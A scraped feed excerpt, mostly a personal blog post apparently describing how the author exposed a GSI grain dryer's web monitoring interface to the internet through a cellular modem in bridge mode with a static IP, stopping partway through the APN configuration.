uD5QHDsD4PFwjwPp/f7/P7OD9MLT/DuFnZdrmmSFGlpJUQEx8EnubJ8QDFHm6K522s12hBrTihR6zjkxZ/YEqiejlYiZ/zBXz+KRj7Azwc4Ssez4wlbnEfAlt0W2IHU2FB9ysumHqK72hqqt29veq3b178ZGPy3yLPRO3VNLfAagBmtqD5+QWjd+9hVjuKWfUTBgS1wmDSbDFNms0WxG7Hh+6M9PffBpOCYcGhmEd1sx6e57VNjdVhL7f+a0972dXCbw4n/3nbyQ835mVlERQDd28P6JKTz5SUlCUmJl26dPla5fWCgsLS0rLCwovncnLLyyvgYkLCqbY2DWiQqORcKvRDxbwiglxibk4Z8Uf1/sghBCtOOJ6edz7vYlHKprCS7ExBsS9gNE0aTSajcVJ5o35QN2QyTdYpbzQ2qWvrlINDw719/SWlZVVV1cPDo2LPF7RKWX+gYgAHpnijGanZ9FZnbZUqJUEb9mLM9s1FxcXlu7c3xhzieB7aBLA9YoIg6/AP+5jzQcrhjOc4H+uFQ0AwD5qJWGLTFT6XPR/MA9jmqPt43c2i853KGs2GVy//YVP78GhbxNaGE0e9oJjzWxAsOnr/8bi44pLSmJjY/ILCPXv+evr0GcgrZAHyKpW3VOFykOK7C94j0q1ZMFSmEF7OzfM3jh9u+mDtrd7e1lu9t8YNnecza8NW9XZ0+Hnhr7zi2t+jog4cOLhrV/jSpUuvFpesWLHii91f7N23Lzw8HHRLPz+md3PQthaRQeBppBhwCok0INj1yJ31619t3x/ZHL6lLuylhnMZLM97BH+noJhBcVzcibLvyuPjT55NTUs6fTo9PSMpKSk2JhYmCYYFNzKSkkTDwK0Ips6yp3gUJ9qLL9cfPdB06lifVssGpji4xflZjw/S6Q/AJg7ABzzphZQKR4EH6WeC+5ccsuHTKbgf2CvMLvYIkMjzkFdhdugMQaUgtUypYckYoXmJryl6DvX7bgtX7g+WdHtYr1cMFpqldOXBrw0hpA4KKwimSm7PKhZ/lNHM/wFC85cevXoo6gAAAABJRU5ErkJggg==" alt="Personal OKRs for Success" data-v-25298ab3="" src="https://www.mohitkhare.com/_nuxt/0b543a8b05ad63f5c8bf88ee97692842-613.png"></p></a></div> <div data-v-36f5b510=""><a href="https://www.mohitkhare.com/blog/personal-okrs" data-v-36f5b510=""><p data-v-36f5b510="">Personal OKRs for Success</p></a></div></div></div><div data-v-36f5b510="" data-v-e9f7aa1a=""><div data-v-36f5b510=""><div data-v-36f5b510=""><a href="https://www.mohitkhare.com/blog/making-decisions-the-right-way" data-v-36f5b510=""><p><img data-src="/_nuxt/c04ef31c75ad70464207ddcf44872feb-1000.png" data-loading="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAIAAAADnC86AAAACXBIWXMAAAsSAAALEgHS3X78AAAFHUlEQVRYw+2W+09TdxTA+09MGTDkMR52wtg0BgqlLZTe3va+2t7e8hDDFKPy2ARRhhRaufSW12Jw04y5OQXceMz34qyoqDhhY0sQGMrMEoNITOYmTggOKN1p76yLulEQ2C+cfHPy7b3f7/mcc773e04FerzsfxmCJfASeAm8BF58ME1Y9bhFj7OLCgYqoyjQq0160jo39qzBDM5qMGsquj0vMmrd61FatVlPcHNgzxYMAEsqkn9MhLQLVbYVcUYhpsFZZiHBTtNJOItj3D4FMxhD9Abi/SHkWR9xeuxmmqpgsFLXGnaewQxZbsDLKKoyWba1A8X6I/CT4fgFIdblK2dDURVZxhAcQ1gYj9PuEZjGLVp5PomXZoo21gpjbiHY2VimfXCwqba+dZm4wUdUGInRmJlCjTploYdHPiOYpQkuVVlQFRzDvYm2BSHNwrhfVJoLb1MnWk7X51vavCRHfMS21ySfrdGYwxONq1QUyTEvHzGDsSRZkS/L6A5Bmv0kF5fhjcK4W5i2JwQ77yNt95N3BarrvKNPL1e0+isvhctPBSJauGbEzHdsBrABZwmyoliWfiMUPfyqqOUVSX2o+Cam6V5J9K3UXA+jOgLQQ95RX3pJWrzFVyMQmz9CJ+TqyfKXBcM90ZLlGfJsW2B0/ipShxiz1mq7EfSncOpaENoVinWuQKr9xLQ8L02SWbcqvjYonlSbGGdFm4ePy0JjpWmidJ3KnEqYDoTJrsgUA6u1dcGxtuDEi36KWq/VOVEbcN2eFFlOijST9qyWeXyPSasWL9+C5FwTyo9Gym7GaurCYk8GyL7ylZ7yFnHhOtJ1l2iPK6inYAO2W4tbN6C530WgXwdIv49WHgmLa/KN/cI7psNfXhJpICmrAWqIs4zMbwGBw8at6ej27gikOQCpWaNqDI7at3ztByGJ/f5y41tJBFUOV2D+S6azNxDWDOX2pjckqfE7kvD8XKl0vRgjUGONECuJ0BGaygUBu1ohl4LuSpNlUUTlOmzbFjpZr2B00J2Uu9ZLc+hZ9sfZdSeonToo2oQFTzQdq2vdmbmfUJgY0qqbfVeewx8B1kBa1AnFPddvV3EtMIGfi9CPoQuV6dRsqq784cjY8eZvUVlREsXxz2HCD2hTswMbSKcJWs265y6LFl7zI1nDYfJiU2G9w+G40T+oVZXCQwPF0RgL0ePyEtAkYv5vNngp+OcP2IPJS8CEc3+8kSdRSjO4AmepkhnV8cV4YgmWUNxxtd/hkt1FDQmiAlW8ESwc/MTW1Tnwzemu7E37YL2B4p4tBqSFIZ02IWdPwaTCXGVp6eu5PXz3txt9g3urTwCDQsxb3tkL2duW+fG5Mz+2X+4r2nGIMzcC0m6fBn1n8Ne2892HP23lXbHb7aD/eDiWtekj8MadNkBCPOANkWgCnayxCvinEOjnB87BnulppzmHS5063nm5rffx44mhO/dHHozyIY6P/zn6aNzxIpmassOYnJiCeW/P7a0b9sJBAAPaM+QSJu/nHSzMO5iXXfvzwJAAAteqdmdu/JA3NzkJu537+YDcAg7xdqed4ph+8hKWTf293u5eDBZA3xv+HWAKcSFkrqb6xN2h+xOTUxMTU2Njj+GtANII7/ZUHnUnyi3ghNMPl2m3H4B9xqcXCmwEbTvzAxxfU8OlJ1467fAxCMCdne8duDf84GmeF0Cetyx4d/P+kZHRBaJCfHyIz78SXLnUy38XjsUVwSPXN7VgOf5X+QuyMiOTQYnkogAAAABJRU5ErkJggg==" alt="Making Decisions: The right way" data-v-25298ab3="" src="https://www.mohitkhare.com/_nuxt/c04ef31c75ad70464207ddcf44872feb-1000.png"></p></a></div> <div data-v-36f5b510=""><a href="https://www.mohitkhare.com/blog/making-decisions-the-right-way" data-v-36f5b510=""><p data-v-36f5b510="">Making Decisions: The right way</p></a></div></div></div><div data-v-36f5b510="" data-v-e9f7aa1a=""><div data-v-36f5b510=""><div data-v-36f5b510=""><a href="https://www.mohitkhare.com/blog/productivity-chrome-extensions" data-v-36f5b510=""><p><img data-src="/_nuxt/6162e8bc88982ff3c2db9ce53102c07a-800.png" data-loading="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAIAAAADnC86AAAACXBIWXMAAAsSAAALEgHS3X78AAAEEUlEQVRYw+1WW0hbSRgOFNanug+CVXxYlWi9BrO1+BBpC6XQy1OfFJaCpcIKuwuLUGhrK4oYtcULWu9RXBcvVbNGI6s16x2lrZfE1tbGKxVtjTG9JEZNTs45/TzT1ZgYm9K+FM73MJlz8s985/vnn29GcNwNhISECIXCqKiotbU1lmUZhmG/GgKemCfmiXni7484ODhY+DkEBQUFBASIRKJvSRwZGRkdHX3iUCBALBbHxMTodLpdYpPJ9MFtINiRWCqV0jSt1+vfugb+tVqtNTU18/PzZNjW1lZERISHh4enp+fRQ4EAhIWHh2OIfbYEBQUF+KEo6pC02Gw2tE1NTXNzc+TN9va2RCLx9fX19/f/yQ4BTggMDPTz84uNjcWQfcT5+fl7xNxbBhnY2qStFub/Nw7EZDBaBDIcyCMAWZsHgcjdl+o9Ym78pnr0nfT2+h8Jhuu/GR/8bds0H6gYme/q6hoZGRkeHh4cHBwYGOjv7+/u7iaRbhXXJ2KLBa3h0cDrsxKdRPz+4inDhZMrkgh9+i2aYWknYijIyMiQyWS1tbXV1dUlJSWFhYV9fX1fUNWEmKZs26ztZtu18Wjh/K+/P6jvHZHnmTv8TP/8QOnbaS7UQXFbm0Iul3d2dv7LAepHR0ehG/QKhWJ8fBz9hxw0Go1LYpZhV94vn+68eC/tTHFl3+n7T+IrplZexLHPBdSbVJsTMbZHXV1dRUVFcXFxeXl5aWkpOtDd0NCA5OODWltb6+vrlUrl1NQUvmBHG00fTKwzrZ2rvXBZcelGsyLqT+WlrIf6Z+dZjYB6LXUmRqqxtCqVCuLa29uheGlpqbe3t6enp6OjA4uNztDQEOSiFBYWFpxtZ19VX1feEBWJr7Yl/FKXK1MlsE+PmB8fpTbUNONIjPiioqL09HTCmpmZqdVqoRJpSE1NzcvLq6qqyuWQmJiIT3Sp2EpZ0b4yLMX/dSUs9+czMtFzlYfpvx+NCyVcVVPOxJhOrVajhT5S2KQzMTEBrRCKxZ6ennZlEnuKGXZH1zuzQfa4UT50x/Iixax/xMUwztsJa5yTk1NWVoaXEJeVlZWcnIw6T0tLq6ysRIXjMSUlpaWlZXc3OhIjG8SJ8PcOPXEDZIYzDxsHC7fZGhsb7Q0EqaM47DoJwlDtmIrYhZWDy+2EpXLTMpubm4lXE5MyGAxw/42NDXTW19ctHEBpNBqJ+ZOzYYUDzMuROC4uDpnJzs6+6xrIKlYkKSlpeXl51yw1avXY2NhLrXZ2dha7FuuNzurqKjb04uIi+jMzM4ifnJzEquOkcShsAZzd29v72KHw8fHx8vLCjQA69o23m8jZwO1t/IBUh4aGhn0OONRwCcGRbH8eO0z6pbcD/rLHE/PEPDFP7DY+Aj8diF6OEZ/ZAAAAAElFTkSuQmCC" alt="Boost Productivity with Chrome Extensions" data-v-25298ab3="" src="https://www.mohitkhare.com/_nuxt/6162e8bc88982ff3c2db9ce53102c07a-800.png"></p></a></div> <div data-v-36f5b510=""><a href="https://www.mohitkhare.com/blog/productivity-chrome-extensions" data-v-36f5b510=""><p data-v-36f5b510="">Boost Productivity with Chrome Extensions</p></a></div></div></div><div data-v-36f5b510="" data-v-e9f7aa1a=""><div data-v-36f5b510=""><div data-v-36f5b510=""><a href="https://www.mohitkhare.com/blog/reading-101" data-v-36f5b510=""><p><img data-src="/_nuxt/9eb30de577280fbbf9bf2f184e8fba97-800.png" data-loading="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAIAAAADnC86AAAACXBIWXMAAAsSAAALEgHS3X78AAAEnklEQVRYw2NQJwJoaGioqKgYGBi8evXq//////79+08xYBi1eNTiUYtHLR61mBSL1UBAHYRgNqmpo7BpYrGGhromEGioa6iraaipaoDt0gSywfaBgDpISklJSU9Pn5oW5yaFH10z+ci62Tsa3TdPzlnVm7mmLuT0jOqTS8tWNiXNyLE4syh/SYH1smKLgiC9h0+pZ3FHXfH36zt/Pjz9ZGHYw93997Z1PVxT9v/m7v+3Z96dl763wfz/pe6bU4KfLwmfnmN15+ELuMVfv379TDT4+uXLf1TnMtTlxz/cPuH5rik3eiwvrap5cmz13b1z359Z/f9s591pQQfr9b9syzzUYLO/xaY1wfD+45cQbT9+/DA0NOTl5RURERHGC4AKgMqA6eP79+/IocXgZSydZ8na4CV6fGLUoaU9hxe2XVjZfmp+2erm6EBdbk9NzjAj3iwrjjADTjdj+Wcv38AtNjMzAxoqIyMjJSUlKSkJJyEAwpaWlgYqEBUVNTc3R7c4z9/4Up/nwQUNq2f2zmvK3D2t6OzcnFkFbuUR1jEu+iFutllh7ulWvBuq7Upjne4/fo6s+e/fv7/B4C8YAMUhIj9//vwHBt++ffsKBkAGehz3tDf8un902YS60sTA1qzA3oKgzmyfJQ2xVzb171vY3lWWOrkutzlQ/vai2O6CgLsPnkK0/fr1a+eOnQcPHLh06dKVK1d27dp16tSpLVu2nDhx4vLly3fv3j1y+PDBgweAAYMzcXXWFtzfPWtpX8W66U3HVk04smrSrgWdG6ZUnlw77eGFo6e3LS2NdKryEDnW6dSc5nrv0TOINqAPaqpr2traent7p06dWlVVNW/evKysrEkTJ65bt+7AgQP9/f09PT1fgGkKRy5gKMlOfHz99I1jW/ZtWLRgWs/8KV2bl82+fHjzrWMbH53c8P/9vYV1sdE6DO7qnHYGSi9evUYLaiD48+cPMHgh4j9//QJygWxgaEMYOH3s7Wyxc/PKFZv3lNS0FFXUFpZVlpZXNtTXzZkxae+m5TfP7r+yoX+SN2uoIY+dvhrcYiB48+bNx48fgX56BwZAm4ABC0xBnz59ArJfv34NjFqg+LOnT58/f44Z5gwtFbmfr2y7c/Xc60e3vz+5+uPp1Z9Pr/x8cvHr/TNf7526tGf5zAj1+V4Msea8trqqL2EWAz164fz5M6dP37xx4/atW+fOnj1//vzt27dfvHhx/Pjx+/fvQ2IayLhw4QKQDXQiWpgzNNeU/X937+nlI/du3Xj/8NLHm4ffXj/66vbxN7f2v7+99+r2abOi1FttGNItWd2NlJ6/fI2qH2EQRBDkpj9/IGxIOscZ1K21pf/f3vl45/SHO2dfXT/x+e6pz/fOfLp3+uv9ky+v7F/Snr26yrPJnfdsiUF5tOWDJy+Q7UB2BKnlKIOPp1tNaX5pflZZfmZxTjqIUQBiA1FJboa3o5Wvg0mkg0ahn5m3k+mz5y+pVlYrKipJSklLScsAkbSMLIQB48ooKqsoKqsqqGhIyClp6+hTt1rU0MQNINUikFJXUwWWty9fjjZ9Ri0etXjU4lGL6W8xAIU/JG106R/JAAAAAElFTkSuQmCC" alt="Improving Reading 101" data-v-25298ab3="" src="https://www.mohitkhare.com/_nuxt/9eb30de577280fbbf9bf2f184e8fba97-800.png"></p></a></div> <div data-v-36f5b510=""><a href="https://www.mohitkhare.com/blog/reading-101" data-v-36f5b510=""><p data-v-36f5b510="">Improving Reading 101</p></a></div></div></div><div data-v-36f5b510="" data-v-e9f7aa1a=""><div data-v-36f5b510=""><div data-v-36f5b510=""><a href="https://www.mohitkhare.com/blog/transactions-postgres-golang" data-v-36f5b510=""><p><img data-src="/_nuxt/6431c37e5906bbb06dc74faf07dfbcfd-800.png" data-loading="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAIAAAADnC86AAAACXBIWXMAAAsSAAALEgHS3X78AAAE8klEQVRYw+1W6U/bZRxv4F8giEAMJBhgkAnJwjLfmMzEbS9MFuWFJm4sgEOQTWRcy4CBAoVSekEvrq4ctqWFFhgttJylXHITbgQ55CwDFghYQPBDf66rBZnHErOknzTf3/P7Pk/7+d5PSe5/Ax4eHm5ubj4+Pmtra8fHx0dHR8f/GSQrsZXYSmwlfvOI8aMXXgUvLy8c8/X1XV1dfW3Erq6ubxvh4OAA+ZYRhMbJycnZ2RkLR0dHKD09PfV6vYkY8rd/AkvigIAAkUgkFBaJxeLS0pIyiUQslpQUF+PD5/F5XE5p6Q/FJSeIiIiYm5t7bR6zWCw8nunXdLrWZm1rW1t7b3dXQ1OzVqttam4pq1Q2NzWu609SW1xcPDk5icXh4SFkZ2dnUFBQWFhY6LnAgeDg4JSUFAunSTQafd+wl5RO/ySOc/lLSjRTnMCWXAmh3ojMThaobqWWXotgJaRlra2uiMTiiYkJfGd/fx8yPz+fRCLZ2tqSzoWNjQ0kSsRgMJhHi8ThcAd6u28/5nsGsfxCc77hPPUOZngH0n3uMr0DaZHsqg8eFNyMYTc2aBQKxdjYGL5D2L6+vt5pRFtbW0dHBxaQWLe3t2PR1dVlUgKDg4OWHnO5XJ1O5/+Q6x3E+Cg6L0feFpervBFbcDGYdjWSz6rQRfGVHz9g6bTNcrncnHhjY2NkZGRpaWlvb29lZWVxcRHNtru7iwKEcnx8HK9Qwj5UhnlV/kHM5nCG+nsDk/Pc79Cux+QnPVFHcqsfFdS+81laNO9pSpHmHrvmi1jq0vxMmVRGhNrkcXZ2NplMzsjISE1NjYuLY7PZFAoFKZAZwePxaDRaenp6+L1woVBoScxksXaeb4Qm0i/ezb4WnfcVvdwnmB7Dr3n3FuXz70vDmfKo3NqEdDqOikRiorgI4s3NzYaGBrVa3d3drao9QX19vVKlQkbqNRqEuq6urrKqSqNWz8zMIDyWVc1gMPDIYPKu3Od9GMn7lltzPU4A+gt3qJdCmJSy1gKZUiB4gjNFRUXmVY2wM5lMKpUqlUorKysLCwtz+XxoYA3W+Nn4+HiqEfPzC6ebkEShZOJRIZN++pDnG8ZP5pVJlC0hDMV7QTT32xkx+Wp5jYZKow8MDJSXlyNzJo9nZ2fhYktLi0qlgtPT09OQRHFNTU3By76+PlRPY2Mjts4gzsw8If555qfYFFoYWUDOzMrIkzBlWr9QllcgLYGvSM0RJqZSJicnkDaCmPAYNFFRUfAMsUWaq6urcQBTAU6j45FppP9xUhIkjDOZ+5IYoSDMGRwckMukFYpKgbDoUSb/cjjX72tOxHeM4f4f9cYBguFFhNpkOywgxiGhMbzAnhEHBwfYwuvpefmSGIdMqt3t52RuyaUwzvsReYmZ7M1nekJvQbyzs4PC3tra2t7eXl5exit6CTToHEhUE7Yg0VpotjNmNRFqHAU3JJzYN/wqFEmv3mfejGaVycoPjXqiuJA883bq6ekZGhpCmw4PD2OBKQFlf3//6OgocozUQkKPVyI7Z8xqk8eEN78szNeqNRg78OMkpMbd06E+H0dG/OUl4e/vjzbHBCC/QFpaWlZWFlJAp9MxENKMwCuuhIWFBfNr0QLmpr/SOJKLiwvuWoc/g7iV7e3tiS1cyXZ2dhj0pyffv78Wcb3/P/9ArP8yrcRWYivxG0f8O49FUp+RTJP8AAAAAElFTkSuQmCC" alt="Transactions on Postgres with Golang" data-v-25298ab3="" src="https://www.mohitkhare.com/_nuxt/6431c37e5906bbb06dc74faf07dfbcfd-800.png"></p></a></div> <div data-v-36f5b510=""><a href="https://www.mohitkhare.com/blog/transactions-postgres-golang" data-v-36f5b510=""><p data-v-36f5b510="">Transactions on Postgres with Golang</p></a></div></div></div><div data-v-36f5b510="" data-v-e9f7aa1a=""><div data-v-36f5b510=""><div data-v-36f5b510=""><a href="https://www.mohitkhare.com/blog/productivity-in-vscode" data-v-36f5b510=""><p><img data-src="/_nuxt/c00f15909b09287ab6dcd91cb9702fc0-800.png" data-loading="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAoCAIAAAADnC86AAAACXBIWXMAAAsSAAALEgHS3X78AAAEiUlEQVRYw+1WSUwbZxSeQntp1KoHxBJUBCpKIeQAUqscorRVlaKqt1YcKvWAWhSpBzZFIKoACkLBZjNpIRKrTezYgCEoFAqBIlybTQaMHfadmMVgA8YYXC94mX7MUMcMiNI2l6r+NHrzzz8z//e+997/Zoj3L4CIiIjw8PDo6OitrS2SJF0uF/mvQXiJvcReYi/xf48Yi179K0RFReGxmJgYnU7nJoZ1XBhOp5NJHBYWFhQUdPksYD6QuhUcHOzv7x8ZGbm9vf3KFMfHxzc0NHC53NqT4PJ4IgFfLOQ/qq2t4fJEdXWpqakrKyt4BwpgFQpFcnJyenp62rnAAykpKRwOhyGaKCsrw8lut3vO0orW9x1jBqebSSgUzs/PY3B4eAhbXV1NEISvry9xLnx8fGBRKDabzTNaRFFREU5Wq81uP87HIeWEQr17q/DXm5UzqTJL56IJMwKBYH5hAQPad61W29PTI5VKe3t7ZTKZlIJEIsEYFuPfKEgoDA0NMRUXFxe7FcMbh/PII+nc1o0CybXsXz7lzsX+bIltMhhIUlwnnKMU015bLJbNzU3U+eLiIlKgo2A0GtVqNSzmURCwGK+uruJhZo5p4nK5tmJ420Gt2PJcE53b9V5mxwe5HXHi1din5s+fGHROsrH+mJiO/OjoaE5OTmJiIlYoLCxksVjl5eWIP9I5Ozvb2dnJ4/GQR8xnZGSoVCp3qI6JSzgcnD6qnL50T5n2TFMhWwy/2xqY3nqzSDLyYueB0vah0Hir8QQx/f7S0lJbW1tXV9fIyEh/f39fX9/k5CQI6GjPzMzAs46OjpaWFqVSabVamYqLKMUv9OYvRcv+7IkQliLkh/bvBUOavaPgsIYtMULjJ2KD1kk2nVQMPkgsKCioqqrKy8srLS1FuUDlwMCAWCyuqakRiUTNzc1yuRx+MOS+DDXpdNxpVL2T2ReYP3mZ/fzhoI6+nSu3XBMYb9QbNj2I6SWQS0hB+bS3t8NOTEwgwt3d3dC9vLyMW1AMJ2DHxsZO736CQ4X6m+pB4rv66/c7vxIuvJmjejtX9W2z2mp35its4bXG6yLDhoOpeHh4OCkpqaSkBMGEbiQV9Gw2u6mpCdXO5/MrKipQBFlZWRifoZjO8Rc/ST97IFvV/+5wkbefqt/IHvXNVn5cOf11q/7Ko/2Yx7uexO6WaTab7X8C61ooWCkcHByYTCYzBUaTOBHqA7PNbHPQOwpH2rP11zKVr9+Vv/vj0tXHppBK/doh+eQk8Wn8rVb6ch+7aCAm1Ov3pVoiffCt/IUrfFNyzz5m6kTHnevV9Gq6c6Gfub8k9qPjKB8PBzS32zZUW7i20Z1rwaNzoTOggej1+r29vbW1tX0KCOz6+jqCvLOzo6egpnDGdsI2ON2rGWD0app4d3cXpYtiRmOanp4eHx9H9YIJg6mpKY1Gg3a2sbGBMeocDjGJ4+LiUJnYiOxTYLHcBwsZSUhIgLKLh/r8x4jQ0NCAgIDAc4EPs5+fH/4FGN9j1ym4Jz3pz/SAwOf9n/2BeH/2vMReYi/x/474D5XblxQw5EkNAAAAAElFTkSuQmCC" alt="Improve your productivity with VS Code" data-v-25298ab3="" src="https://www.mohitkhare.com/_nuxt/c00f15909b09287ab6dcd91cb9702fc0-800.png"></p></a></div> <div data-v-36f5b510=""><a href="https://www.mohitkhare.com/blog/productivity-in-vscode" data-v-36f5b510=""><p data-v-36f5b510="">Improve your productivity with VS Code</p></a></div></div></div></div></div></div> <div data-v-373a3b57=""><div data-v-76d4e02f="" data-v-373a3b57=""><p data-v-76d4e02f="">
    Liked the content? <br data-v-76d4e02f="">
    Do support :)
  </p> <div data-v-76d4e02f=""><p><a href="https://www.paypal.me/mkfeuhrer" aria-label="Paypal - Mohit Khare" data-v-76d4e02f=""><img src="https://www.mohitkhare.com/_nuxt/9922499ba185bcccc368872c4cf7b0ea-320.png" alt="Paypal - Mohit Khare" width="125px" data-v-76d4e02f=""></a></p> <p><a target="_blank" href="https://www.buymeacoffee.com/chHAzigTb" aria-label="Buy me a coffee - Mohit Khare" data-v-76d4e02f=""><img src="https://www.mohitkhare.com/_nuxt/img/bmc.87873ba.svg" width="175px" alt="Buy me a coffee" data-v-76d4e02f=""></a></p></div></div></div></div></div></div>]]>
            </description>
            <link>https://www.mohitkhare.com/blog/postgres-constraints</link>
            <guid isPermaLink="false">hacker-news-small-sites-25031762</guid>
            <pubDate>Mon, 09 Nov 2020 05:35:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Monitoring a grain dryer remotely]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25031661">thread link</a>) | @vaillancourtmax
<br/>
November 8, 2020 | https://maximevaillancourt.com/blog/monitoring-a-grain-dryer-via-the-internet | <a href="https://web.archive.org/web/*/https://maximevaillancourt.com/blog/monitoring-a-grain-dryer-via-the-internet">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
    
    <p>A relative of mine called a few months ago: “Hey, I have a grain dryer that I’d like to monitor from my phone. Is that something you could set up in time for harvest season?”</p>

<p>I have no idea how grain dryers work, especially not Internet-enabled grain dryers — because <em>of course</em> that’s a thing — but I figured I’d give it a shot anyway.</p>

<p>For context, a grain dryer is literally a combination of a huge furnace and fans that, you guessed it, dries harvested grain for optimal (lack of) moisture.</p>

<div>
<p><img alt="A GSI grain dryer next to a grain silo." src="https://d33wubrfki0l68.cloudfront.net/5a21714733e72c8597435c3ac8150c2fdf955de6/5cfa4/assets/dryer/gsi-1220.jpg">
</p>

</div>

<p>Such dryers typically have an embedded computer running some version of Windows and a touchscreen display that allows monitoring and controlling the dryer’s temperature, timers, and other parameters to get the perfect output.</p>

<div>
<p><img alt="A GSI grain dryer's control panel." src="https://d33wubrfki0l68.cloudfront.net/1b66a66084b20383b3d61ebe1da9a9aa038dd8f7/cccbd/assets/dryer/controller.png">
</p>
<p>
  A GSI grain dryer's control panel. Image © <a href="https://www.grainsystems.com/master/products/conditioning/watchdog-technology.html">GSI</a>
</p>
</div>

<p>However, because these things run for hours at a time, and because agriculture workers during harvest season usually end up in a sleep-deprived state that lasts for multiple weeks, having the ability to monitor these grain dryers remotely lets workers get more precious sleep time (instead of having to walk/drive up to the grain dryer to see if everything’s okay in the middle of the night).</p>

<p>The desired outcome is to monitor the grain dryer remotely using the web interface:</p>

<div>
<p><img alt="An iPhone with the grain dryer's web monitoring interface open in the browser." src="https://d33wubrfki0l68.cloudfront.net/2ec442d267d87ac17aa3ace20b6c0a536e74fcc5/89508/assets/dryer/web-ui.jpg">
</p>
<p>
  The web interface to monitor the grain dryer's current state. Image © <a href="https://www.grainsystems.com/content/dam/Brands/GSI/Brochures/Conditioning/gs013_Modular-TSeries-Dryers-2017_7.pdf/_jcr_content/renditions/original">GSI</a>
</p>
</div>

<p>It’s now harvest season 2020, so I connected a grain dryer to the Internet yesterday. It was fun (and weird) and I learned a few things. Here’s how we did it.</p>

<h3 id="what-youll-need">What you’ll need</h3>

<ul>
  <li>A GSI grain dryer with a <a href="https://www.grainsystems.com/master/products/conditioning/watchdog-technology.html">Watchdog module</a> installed (I was lucky that the dryer already had this module installed)</li>
  <li>A cellular modem (we purchased a <a href="https://www.netgear.com/home/products/mobile-broadband/lte-modems/LB1120.aspx">Netgear LB1120</a>)</li>
  <li>A cellular data plan with a public static IP (we went with Telus, a Canadian cellular carrier, and needed to open a business account to get access to a public static IP for 15$/month per month on top of the base data plan)</li>
  <li>A laptop with an Ethernet port</li>
  <li>A few Ethernet cables</li>
</ul>

<h3 id="topology">Topology</h3>

<p>Here’s how the network topology looks like:</p>

<div><div><pre><code>                   (via public static IP)
                        +----------+
         +--------------&gt; Internet &lt;--------------+
         |              +----------+              |
 +-------v--------+                       +-------v-------+
 | Cellular modem |                       | Mobile device |
 +-------^--------+                       +---------------+
         |
+--------v----------+
|    Grain dryer    |
| (Watchdog module) |
+-------------------+
</code></pre></div></div>

<p>Essentially, we’ll expose the grain dryer’s web interface to the Internet via a public static IP using a cellular modem. Once it’s exposed, the operator will be able to navigate to that static IP from their mobile device to access the grain dryer’s web interface.</p>

<h3 id="subscribing-for-a-data-plan-and-a-static-ip">Subscribing for a data plan and a static IP</h3>

<p>I called various cellular carriers here in Canada to learn more about their data-only plans and the possibility of adding a public static IP option to the plan: the only carrier that seemed like they knew what they were talking about was Telus. Others either didn’t offer the public static IP option, or didn’t know what I was talking about.</p>

<p>With that, we went ahead and signed up for a business account at Telus (required to get access to the public static IP option), bought a SIM card, and a data-only plan for the modem.</p>

<h3 id="setting-up-the-cellular-modem">Setting up the cellular modem</h3>

<p>First up, we need to make sure we’re able to connect to the nearest cellular tower to connect to the Internet. The Netgear LB1120 is fairly easy to set up on paper: pop a SIM card in there and we’re done, right? Well, for our use case, not quite. There are a few things to do to set it up to use the static IP assigned to the data plan from the cellular carrier. More importantly, the modem needs to be set up in “bridge” mode (instead of “router” mode) to act as a simple bridge (rather than a router) to connect it directly to the grain dryer.</p>

<div>
<p><img alt="Laptop, modem, cables, and various manuals spread out on concrete." src="https://d33wubrfki0l68.cloudfront.net/d011a2ceee600cafd7f0ee676b393623f84bbef4/f13bd/assets/dryer/setup-modem.jpg">
</p>
<p>
  On-premise setup to configure the modem and the dryer. That's my trusty ThinkPad X220.
</p>
</div>

<p>Days before arriving on the premises, <a href="https://community.netgear.com/t5/Mobile-Routers-Hotspots-Modems/LB1120-Bridge-Mode-No-Connectivity/m-p/1404666#M3431">I read online that the firmware that ships out of the box is broken</a>: “bridge” mode doesn’t function at all, and an update is required to fix it. This made me a bit nervous because I didn’t have the modem with me, and wasn’t sure if I was going to be able to get the update to work properly. Thankfully, upon inserting the SIM card, turning the modem on, plugging it into the computer via an Ethernet cable, and accessing the modem’s setup interface at <code>http://192.168.5.1</code>, the modem’s web UI suggests downloading the latest firmware over the air. Neat!</p>

<p>From what I read, you must use a firmware more recent than <code>NTG9X07C_12.09.05.27</code> to make sure “bridge” mode works fine. In our case, we updated to <code>NTG9X07C_12.09.05.30</code>, so we’re good.</p>

<div>
<p><img alt="Updating the modem's firmware over the air." src="https://d33wubrfki0l68.cloudfront.net/7d6dd2d298b3cf861f6144dc01dc774b85ac9ff3/a036b/assets/dryer/firmware-update.jpg">
</p>
<p>
  Updating the modem's firmware over the air.
</p>
</div>

<p>Once the update completes and the modem reboots, we can go in the settings and change the operation mode to “bridge”:</p>

<div>
<p><img alt="Changing the modem's operation mode to Bridge mode." src="https://d33wubrfki0l68.cloudfront.net/34c50316b7c48bdcf08962a436d697d2ff1b9c27/a56a3/assets/dryer/bridge-mode.png">
</p>
<p>
  Changing the modem's operation mode to Bridge mode. Image © <a href="https://kb.netgear.com/31163/How-to-change-4G-LTE-Modem-from-router-mode-to-bridge-mode">Netgear</a>
</p>
</div>

<p>Doing so “turns off the router function of the device and assigns the network IP address directly to the attached host”, which is exactly what we need to connect the modem directly to the dryer’s Watchdog module. Save and let the modem reboot.</p>

<p>Now, the SIM is in the modem, which has the latest firmware and is in “bridge” mode, but there’s one last thing to fix: the cellular carrier is assigning a dynamic IP to the modem, which isn’t what we want: we should be getting the static IP for the data plan we’re paying for. To resolve this issue, we need to tweak the modem’s access point name (APN).</p>

<p>I got stuck on this issue for around 30 minutes before remembering that APNs are a thing and that I could possibly tweak it in the modem settings. I’m glad I remembered!</p>

<p>By default, the modem auto-detects the APN from the cellular carrier. For most cases, this works fine, but in this particular case, we want to use a different APN that allows us to use the static IP assigned to our data plan. APN settings vary by cellular carrier, and I ended up searching for Telus’ APN settings while on premise. I found <a href="https://usatcorp.com/faqs/common-access-point-names-apn-carrier/">USAT Corp’s website to include various APN settings</a>, so I highly recommend trying those values out for your particular cellular carrier.</p>

